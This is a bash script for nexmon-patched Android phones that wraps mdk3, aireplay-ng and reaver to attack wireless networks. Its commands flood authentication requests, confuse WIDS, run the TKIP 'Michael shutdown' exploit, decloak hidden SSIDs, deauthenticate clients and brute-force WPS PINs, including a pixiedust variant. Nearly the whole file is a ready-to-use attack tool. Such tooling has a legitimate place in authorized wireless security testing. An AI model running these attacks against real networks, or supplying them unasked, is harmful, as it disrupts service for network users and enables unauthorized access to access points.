#!/system/xbin/bash
#
# Perform various attacks against wireless networks with your Lineage OS running
# nexmon enabled phone.
#
# For this to work you need to have nexmon installed with the patched injection
# drivers. This script requires either bash or a reasonable facsimile
#
# exit codes 0 success, 1 program fail, 2 help, 4 misconfiguration, 8 undefined
# unknown bug.

### CONFIG ###
iface=wlan0
pid_file="/data/local/tmp/wifi_attack.pid"
save_loc=/storage/emulated/0/Download/
#pps=200 #packets per second, for attacks that use it
### /CONFIG ###

tool=""
tool_options=""
save_output=False
save_slug="wifi_"
export LD_PRELOAD=libnexmon.so

help_and_exit(){
  cat 1>&2 << EOF
wifi_attack.sh: Perform various attacks against wireless networks with your
Lineage OS running nexmon enabled phone.

For this to work you need to have nexmon installed with the patched injection
drivers. This script requires either bash or a reasonable facsimile

Commands:

Attack:
	flood_auth		Flood auth requests. If a parameter
				is given it is assumed to be the MAC address of
				the AP.(MDK3)

	confuse_wids		Confuse a WIDS system. Needs an SSID as a
				parameter.(MDK3)

	tkip_shutdown		Perform the "Michael Shutdown" exploit against a
				target AP. AP must be using TKIP encryption.
				Needs an AP MAC address as a second parameter.
				(MDK3)

				you can use "tkip_shutdown qos <MAC>" to use
				the TKIP QoS exploit in conjunction.(MDK3)

	decloak			Attempt to decloak an access point(get the SSID)
				that is hidden. saves file to Download/ (MDK3)

	deauth			De-auth clients from a specified AP. You must
				specify the MAC address of the AP.(aireplay-ng)

	deauth-client		De-auth specific client from AP. Specify AP and
				client such as:
				deauth-client <AP MAC> <Client MAC>

	reaver_wps		Bruteforce target AP with reaver. need to
				specify AP MAC address(ESSID). You may specify
				"pixie" as the second parameter to use pixiewps
				to try a pixiedust attack.(reaver)

Script:
	help			This message

	test			Test nexutil install

	kill			Stop attack and exit

EOF
  exit 2
}

test_install(){
  local bin_needed="mdk3 aireplay-ng nexutil"
  local lib_needed="libnexmon.so"
  local -i test_exit=0
  for file in ${bin_needed};do
    which ${file} &> /dev/null
    if [ ${?} -ne 0 ];then
      test_exit=1
      echo "${file} is not an executable, script won't run without it"
    fi
  done

  for file in ${lib_needed};do
    if [ ! -f "/system/lib/${file}" ];then
      echo "Cannot find 32-bit Library ${file}, script will not run without it."
      test_exit=1
    fi
    ## 64 bit only
    #if [ ! -f "/system/lib64/${file}" ];then
    #  echo "Cannot find 64-bit Library ${file}, script will not run without it."
    #  test_exit=1
    #fi
  done

  [ ${test_exit} -eq 0 ] && echo "prereqs look fine, script should run"
  exit ${test_exit}
}

android_media_rescan(){
  # This is a media re-scan so the file shows up over MTP
  am broadcast -a android.intent.action.MEDIA_MOUNTED -d file:///${save_loc}
}

exit_with_error(){
  echo 1>&2 ${@:2}
  exit ${1}
}

cleanup_and_exit(){
  local -i exit_code=${1}
  if [ -f ${pid_file} ];then
    local kill_pid=$(cat ${pid_file})
    kill ${kill_pid}
    rm -f ${pid_file}
   else
    echo "no pidfile, killing all"
    killall -s SIGTERM $(basename $0)
  fi
  # This is a media re-scan so the file shows up over MTP
  [ ${save_output} == True ] && android_media_rescan
  #turn monitor mode off
  nexutil -m0
  nexutil -p0
  exit ${exit_code}
}

main(){
  trap cleanup_and_exit SIGTERM SIGINT

  local command="${1}"
  local param="${@:2}"
  local -i pid=0
 
  local -i pid_file_i=0
  while [ -f ${pid_file} ];do
    pid_file="/data/local/tmp/wifi_attack_${pid_file_i}.pid"
    pid_file_i+=1
  done

  case ${command} in
   help|--help|-\?)
    help_and_exit
    ;;
   kill)
    cleanup_and_exit
    ;;
   test)
    test_install
    ;;
   flood_auth)
    tool="mdk3"
    tool_options="a -m"
    [ ! -z ${param} ] && tool_options+=" -a ${param}"
    ;;
   confuse_wids)
    tool="mdk3"
    tool_options="w -e ${param}"
    [ -z ${param} ] && exit_with_error 2 "Needs SSID of network"
    ;;
   tkip_shutdown)
    tool="mdk3"
    tool_options="m -t ${param}"
    [ ${2} == "qos" ] && (param=${@:3};tool_options="m -j -t ${param}")
    [ -z ${param} ] && exit_with_error 2 "Needs an AP MAC address"
    ;;
   decloak)
    local char_set="nul" # Numbers, Uppercase, Lowercase
    tool="mdk3"
    tool_options="p -t ${param} -b ${char_set}"
    save_output=True
    save_slug="wifi_ssid_decloak.txt"
    [ -z ${param} ] && exit_with_error 2 "Needs an AP MAC address"
    ;;
   deauth)
    local -i packnum=5 #amount of de-auth packets to send. must be INT
    [ -z ${param} ] && exit_with_error 2 "Needs an AP MAC address"
    tool="aireplay"
    tool_options="-0 ${packnum} -a ${param}"
    ;;
   deauth-client)
    local -i packnum=5 #amount of de-auth packets to send. must be INT
    [ -z ${2} ] && exit_with_error 2 "Needs an AP MAC address"
    [ -z ${3} ] && exit_with_error 2 "Needs an Client MAC address"
    tool="aireplay"
    tool_options="-0 ${packnum} -a ${2} -c ${3}"
    ;;
   reaver_wps)
    tool="reaver"
    tool_options="-b ${param}"
    save_output=True
    save_slug="reaver_wps.txt"
    if [ ${2} == "pixie"];then
      param=${@:3}
      tool_options="-b ${param} -K 1"
    fi
    [ -z ${param} ] && exit_with_error 2 "Needs an AP MAC address"
    save_output=True
    ;;
   *)
    exit_with_error 4 "No Command Given"
    ;;
   
  esac

  [ $UID -ne 0 ] && exit_with_error 2 "Got Root?"

  #set monitor mode on
  nexutil -m2
  nexutil -p1

  case ${tool} in
   mdk3)
    if [ ${save_output} == "True" ];then
      mdk3 ${iface} ${tool_options} > ${save_loc}/${save_slug} &
      pid=$!
     else
      mdk3 ${iface} ${tool_options} &
      pid=$!
    fi
    ;;
   aireplay)
    aireplay-ng ${tool_options} ${iface} &
    pid=$!
    ;;
   reaver)
    reaver ${tool_options} -i ${iface} > ${save_loc}/${save_slug} &
    pid=$!
    ;;
   *)
    exit_with_error 4 "No Command Given"
    ;;
  esac

  echo ${pid} > ${pid_file}
  wait ${pid}

  # This should never get past this point
  cleanup_and_exit 4
}

main "${@}"
